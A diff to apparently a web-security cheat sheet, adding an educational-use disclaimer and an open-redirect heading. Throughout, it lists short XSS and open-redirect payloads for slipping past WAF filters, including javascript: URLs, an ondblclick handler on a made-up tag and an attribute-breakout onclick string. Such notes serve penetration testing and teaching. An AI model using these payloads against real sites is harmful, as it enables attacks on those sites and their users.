@@ -1,4 +1,15 @@
-WAF Got You Down or Certain Tags Stripped?
+Warning
+==============
+
+All the information provided on this site is for educational purposes only.
+
+The site or the authors are not responsible for any misuse of the information.
+
+You shall not misuse the information to gain unauthorized access and/or write malicious programs.
+
+These information shall only be used to expand knowledge and not for causing malicious or damaging attacks.
+
+Open Redirect
 ==============
 
 /?SomeParam=https://TheDomainYouAreOne&TheirParam=javascript://prompt(1)
@@ -7,12 +18,14 @@ WAF Got You Down or Certain Tags Stripped?
 
 /?SomeParam=https://TheDomainYouAreOne&TheirParam=https://www.google.com
 
-Did you break out of a tag for and script, iframe, img, a etc are all blocked?
+Did you break out of a tag and script, iframe, img, a, &gt; etc are all blocked?
 ==============
 
 Did they block onerror onload onclick? Try something like this:
 
 &lt;XXXXXXX ondblclick=prompt(1)&gt;Some Text, Don't even care to end the tag either.
+
+" onclick="prompt(1)
 
 Don't forget the injection might not be a form tag but in the javascript.
 ==============
